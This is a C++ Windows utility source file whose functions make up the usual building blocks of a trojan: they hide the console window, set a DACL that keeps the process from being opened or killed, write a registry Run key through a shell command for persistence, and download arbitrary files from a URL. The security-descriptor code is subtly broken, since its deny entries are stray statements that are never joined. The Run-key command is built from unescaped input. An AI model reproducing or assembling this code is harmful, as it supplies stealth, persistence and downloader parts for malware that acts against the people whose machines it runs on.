#include "stdafx.h"
#include "Utils.h"

void Utils::HideConsole()
{
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
}

BOOL Utils::DenyAccess()
{
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
	SECURITY_ATTRIBUTES sa;
	TCHAR * szSD = TEXT("D:P");
	TEXT("(D;OICI;GA;;;BG)");
	TEXT("(D;OICI;GA;;;AN)");
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = FALSE;

	if (!ConvertStringSecurityDescriptorToSecurityDescriptor(szSD, SDDL_REVISION_1, &(sa.lpSecurityDescriptor), NULL))
		return FALSE;
	if (!SetKernelObjectSecurity(hProcess, DACL_SECURITY_INFORMATION, sa.lpSecurityDescriptor))
		return FALSE;
	return TRUE;
}

void Utils::Autoload(string Name, string Path)
{
	string command = "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V " + Name + " /t REG_SZ /F /D \"" + Path +"\"";
	system(command.c_str());
}

void Utils::DownloadFile(wchar_t* url, wchar_t* dir)
{
	URLDownloadToFile(0, url, dir, 0, 0);
}

void Utils::CreateDir(wchar_t* dir)
{
	CreateDirectory(dir, NULL);
}
bool Utils::FileExists(const char* fname)
{
	return _access(fname, 0) != -1;
}